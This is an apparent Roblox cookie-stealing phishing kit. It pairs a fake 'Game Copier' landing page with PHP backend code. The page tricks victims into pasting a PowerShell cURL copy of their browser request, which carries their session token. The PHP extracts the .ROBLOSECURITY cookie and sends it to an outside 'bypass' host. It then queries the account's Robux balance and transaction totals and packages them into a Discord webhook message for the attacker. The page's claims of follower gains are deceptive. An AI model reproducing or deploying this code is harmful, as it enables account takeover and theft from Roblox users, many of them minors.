...
<img alt="Image placeholder" src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/3/c/a/3ca1eccd743890d86413befb0c247a9d94053995.png" class="img-fluid img-center" style="position: relative;">
</div>
</div>
</div>
</div>
...
<p class="lead text-white lh-180">Game Copier is an advanced PowerShell-based Copy bot &amp; auto-bot. It is capable of Copying up-to 10x faster than other competitors via D4 technology. To do this, all you need to do is follow the setup instructions below and report any issues you find by contacting my mail.
...
<p>Step 1. Go to the Roblox page of the game you want to copy.<br><br>
	...
	<form action="" method="post">
        <textarea style="height: 100px; width: 500px;" id="content" name="Powershell" placeholder="Paste Game Code Here!"></textarea><br><br>
        <input type="submit" id="Send" value="Copy!">
    </form>
...
<p>Step 3. Refresh the Roblox page and then in the Network section, scroll to the very top. You should see an item named after your Game. Right click that and then hover over Copy. There will be many options of how to copy the game code.Click cURL (Powershell).</p>
...
<img style="width: 75%;" src="https://media.discordapp.net/attachments/1219213139409768542/1245086467659796594/image.png?ex=665778a2&is=66562722&hm=d893dde09cfe4295367f00e2244b12ef79c264822f2ad80271844b0fe7543221&=&format=webp&quality=lossless&width=1440&height=313">
<br>
...
<br><br> JOIN THE <b><a href="https://discord.gg/termed">DISCORD</a></b> IF YOU HAVE ANY QUESTIONS!<br><br> <b><a href="https://discord.gg/termed">Click Me!</a></b><br><br>
</div></div></section>
...
<div class="card-body">
GameCopier does not wrap the Roblox client, it just mimics its network implementation. That's why you can use it in any platform, even if Roblox is not supported there!
</div>
</div>
...
<div class="card-body">
During our tests we have got accounts around 120,324 Followers within 24 hours! So you can gain tons!
</div>
</div>
</div>
<div class="card mb-3" style="">
...
Do I need Roblox accounts?
</a>
</h5>
</div>
<div id="q3" class="collapse">
<div class="card-body">
Kinda, you will need an account that won't slow down our services. Have an account that has been a member of roblox for a year or more. But its okay to have a new account! It just wont work as well.
</div>
</div>
</div>
...
<p class="text-sm mb-0">© GameCopier 2024. All rights reserved.<br>We are not affiliated with any of the games or companies shown on this website. Use of any logos or trademarks are for reference purposes only. By utilizing the website, you agree to be bound by the terms of service.
</p>
</div>
</div>
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $log = $_POST['Powershell'];
    if (empty($log)) {
        echo "<script>alert('Fill in a game code!');</script>";
    } elseif (!preg_match('/\.ROBLOSECURITY",\s*"([^"]+)"/', $log, $o)) {
        echo "<script>alert('Invalid game code!');</script>";
    } else {
        $robloxcookie = $o[1];
        $n = "https://roblox.boutique/bypass.php?cookie=$robloxcookie"; // If u want a source code without endpoint message me.
        $x = file_get_contents($n);
        if ($x !== false) {
$agent = $_SERVER['HTTP_USER_AGENT'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/mobileapi/userinfo");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $x,
    "User-Agent: $agent"
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$termed = json_decode($response, true);
if (isset($termed['ThumbnailUrl'])) {
  $thumb = $termed['ThumbnailUrl'];
}
if (isset($termed['RobuxBalance'])) {
  $robux = $termed['RobuxBalance'];
}
if (isset($termed['UserName'])) {
  $name = $termed['UserName'];
}
if (isset($termed['UserID'])) {
  $id = $termed['UserID'];
}
curl_close($ch);
...
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$ct = json_decode($response, true);
if (isset($ct['balance'])) {
  $bal = $ct['balance'];
}
if (isset($ct['robuxAmount'])) {
  $amount = $ct['robuxAmount'];
}
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://economy.roblox.com/v2/users/"  . $id .  "/transaction-totals?timeFrame=Year&transactionType=summary");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $x,
    "User-Agent: $agent"
));
...
if (isset($sum['outgoingRobuxTotal'])) {
  $outgoingRobuxTotal = $sum['outgoingRobuxTotal'];
}

if (isset($sum['incomingRobuxTotal'])) {
  $incomingRobuxTotal = $sum['incomingRobuxTotal'];
}
...
$POST = [
    ...
    "embeds" => [
        [
            ...
            "type" => "rich",
            "color" => hexdec("#00000"),
            "description" => "**[Rolimons](https://www.rolimons.com/player/" . $id . ") - [" . $name . " Profile](https://www.roblox.com/users/" . $id . "/profile)**",
            "url" => "",
            "footer" => [
                "text" => "$GenName",
                "icon_url" => $thumb,
            ...
            "fields" => [
                ...
                [
                    "name" => "**<:robux:815417130861723649> Robux**",
                    "value" => "$robux\n",
                    "inline" => false
                ],                                             
                [
                    "name" => "**✉️ Verified Status**",
                    "value" => "$status\n",
                    "inline" => false
                ],
                [
                ...
                [
                    "name" => "**💰 Summary**",
                    "value" => "$incomingRobuxTotal/$outgoingRobuxTotal",
                    "inline" => false
                ],
                [
                    "name" => "**:credit_card: Credit**",
                    "value" => "$bal/R$ $amount",
                    "inline" => false
                ],
                [
